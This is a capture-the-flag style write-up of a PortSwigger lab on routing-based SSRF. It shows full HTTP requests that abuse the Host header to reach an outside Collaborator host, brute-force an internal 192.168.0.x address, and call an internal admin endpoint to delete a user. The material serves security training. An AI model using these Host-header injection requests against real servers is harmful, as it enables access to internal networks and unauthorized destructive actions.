## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f6fa8bfc-7ce1-47f0-9289-222aefabd8be)

## Solution :

Send the **GET /** request to repeater.

If we change the **Host:** header value to collaborator domain, we get a forbidden response.
```http
GET / HTTP/2
Host: f4kyfymr73fchhwisozzgp173y9pxfl4.oastify.com
Cookie: session=uD5Oq6coAHVEaugt4oQesXJOaM3yLurs; _lab=47%7cMC0CFQCLAW6vZWc5gkUN55J6cO5a4%2bE1lAIURkzVJJNB%2fN1Jxn0hIBZK9LBnQJcruSf5HbgZTSzg1fY%2fQRUvXmN33Ny8kQZK%2ft7W3xcnkKpvrwd0i8EFCcTJL0ZGS89hlPMvbuwfCgsIsty92zRcqKOX8WJ7RGMhQXdeF10ZpZ3auGzg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1b8985b5-c061-4d42-9f73-e2ff6bc97eff)

But when we provide the absolute URL in the header of the request & supply the **HOST** header as *burp-colab-domain*, our reqeust is not blocked.

**Request :**
```http
GET https://0ae200fc0329a91487ec07b8005600d6.web-security-academy.net/ HTTP/2
Host: xmngxg49plxuzze0a6hhy7jplgr7f13q.oastify.com
Cookie: session=uD5Oq6coAHVEaugt4oQesXJOaM3yLurs; _lab=47%7cMC0CFQCLAW6vZWc5gkUN55J6cO5a4%2bE1lAIURkzVJJNB%2fN1Jxn0hIBZK9LBnQJcruSf5HbgZTSzg1fY%2fQRUvXmN33Ny8kQZK%2ft7W3xcnkKpvrwd0i8EFCcTJL0ZGS89hlPMvbuwfCgsIsty92zRcqKOX8WJ7RGMhQXdeF10ZpZ3auGzg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

**Response :**
```http
HTTP/2 200 OK
Server: Burp Collaborator https://burpcollaborator.net/
X-Collaborator-Version: 4
Content-Type: text/html
Content-Length: 55

<html><body>b3szld401ux7toyz39idauzjjgmgz</body></html>
```

We've also got some hits in our collaborator.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b458c930-e5cb-4d32-8896-64cf47511920)

Finally we're able to make the reverse proxy/server make outbound requests to our server. Now we can make reqeusts to the reverese-proxy & make it send/forward our requests to its internal network.

### Access the internal network via SSRF -

The machine with admin panel in the internal domain is in the range - `192.168.0.0/24` means it will have max 253 hosts.

Send the request to repeater & bruteforce the last octet.

> NOTE - Untick `Update host header to match target` checkbox before bruteforcing . By doing this all requests will not be updated with websecurity.net as host address rather it will be our 192.168.0.x addresses

Once the attack is complete we have our internal machine's ip address - `192.168.0.171`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6520277a-c96b-49a9-866e-37b98797fe8e)

The response confirms that it did redirect to `192.168.0.171/admin`

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Now time to access the admin panel.

Append the **/admin** to the url header.

```http
GET https://0ae200fc0329a91487ec07b8005600d6.web-security-academy.net/admin HTTP/2
Host: 192.168.0.171
```

In the response we have the following form which sends a POST request with a csrf token.

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="tkpqSXo4OWcOm8QMgCH3JHkzb9xQes4w">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
</form>
```

Send a POST request to the following endpoint with the csrf token to delete the user carlos.

```http
POST https://0ae200fc0329a91487ec07b8005600d6.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.171
Cookie: session=uD5Oq6coAHVEaugt4oQesXJOaM3yLurs; _lab=47%7cMC0CFQCLAW6vZWc5gkUN55J6cO5a4%2bE1lAIURkzVJJNB%2fN1Jxn0hIBZK9LBnQJcruSf5HbgZTSzg1fY%2fQRUvXmN33Ny8kQZK%2ft7W3xcnkKpvrwd0i8EFCcTJL0ZGS89hlPMvbuwfCgsIsty92zRcqKOX8WJ7RGMhQXdeF10ZpZ3auGzg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

username=carlos&csrf=tkpqSXo4OWcOm8QMgCH3JHkzb9xQes4w
```
Now the lab is solved.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e6f6c2a8-cd97-4f6a-8e76-9bb05518156b)







